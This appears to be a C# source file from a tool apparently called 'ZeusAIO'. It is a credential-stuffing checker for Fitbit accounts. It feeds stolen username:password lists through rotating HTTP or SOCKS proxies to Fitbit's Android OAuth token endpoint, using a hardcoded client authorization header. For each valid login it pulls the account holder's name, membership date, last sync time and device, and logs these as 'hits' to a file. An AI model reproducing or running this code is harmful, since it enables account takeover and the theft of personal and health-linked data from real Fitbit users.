using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace Fitbit
{
    class Check
    {

        
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = true;
                        string str = string.Concat(new string[]
                 {
                            "username=",
                              s[0],
                            "&password=",
                              s[1],
                            "&scope=activity heartrate location nutrition profile settings sleep social weight mfa_ok&grant_type=password"
                 });
                        httpRequest.AddHeader("Authorization", "Basic MjI4VlNSOjQ1MDY4YTc2Mzc0MDRmYzc5OGEyMDhkNmMxZjI5ZTRm");
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text2 = httpRequest.Post("https://android-api.fitbit.com/oauth2/token?session-data={\"os-name\":\"Android\",\"os-version\":\"5.1.1\",\"device-model\":\"LGM-V300K\",\"device-manufacturer\":\"LGE\",\"device-name\":\"\"}", str, "application/x-www-form-urlencoded").ToString();


                        if (text2.Contains("deviceVersion"))
                        {
                           ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - FITBIT] " + s[0] + s[1], Color.Green);
                                }
                                Export.AsResult("/Fitbit_hits", s[0] + ":" + s[1]);
                                return false;
                            }
                        else
                        {
                            if (text2.Contains("Invalid username/password") || text2.Contains("Missing parameters") || text2.Contains("plan\":\"\""))
                            {
                                //
                                break;
                            }
                            else if (text2.Contains("access_token"))
                            {
                                httpRequest.ClearAllHeaders();
                                string str2 = Check.Parse(text2, "access_token\":\"", "\"");
                                string str3 = Check.Parse(text2, "user_id\":\"", "\"");
                                httpRequest.AddHeader("Authorization", "Bearer " + str2);
                                string text3 = httpRequest.Get("https://android-api.fitbit.com/1/user/" + str3 + "/devices.json?", null).ToString();
                                if (text3.Contains("[]"))
                                {
                                }
                                else if (text3.Contains("deviceVersion"))
                                {
                                    string text4 = Check.Parse(text3, "deviceVersion\":\"", "\"");
                                    string text5 = Check.Parse(text3, "lastSyncTime\":\"", "\"");
                                    httpRequest.AddHeader("Authorization", "Bearer " + str2);
                                    string text6 = httpRequest.Get("https://android-api.fitbit.com/1/user/" + str3 + "/profile.json", null).ToString();
                                    if (text6.Contains("fullName\":\""))
                                    {
                                        string text7 = Check.Parse(text6, "fullName\":\"", "\"");
                                        string text8 = Check.Parse(text6, "memberSince\":\"", "\"");
                                        ZeusAIO.mainmenu.hits++;
                                            if (Config.config.LogorCui == "2")
                                            {
                                                Console.WriteLine("[HIT - FITBIT] " + s[0] + ":" + s[1] + " | Name: " + text7 + " | Member Since: " + text8 + " | Last Sync Time: " + text5 + " | Device: " + text4, Color.Green);
                                            }
                                            Export.AsResult("/Fitbit_hits", s[0] + ":" + s[1] + " | Name: " + text7 + " | Member Since: " + text8 + " | Last Sync Time: " + text5 + " | Device: " + text4);
                                            return false;
                                        }
                                }
                                else
                                    {
                                        ZeusAIO.mainmenu.realretries++;
                                        goto Retry;
                                    }
                            }
                        }
                    }
                    //break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

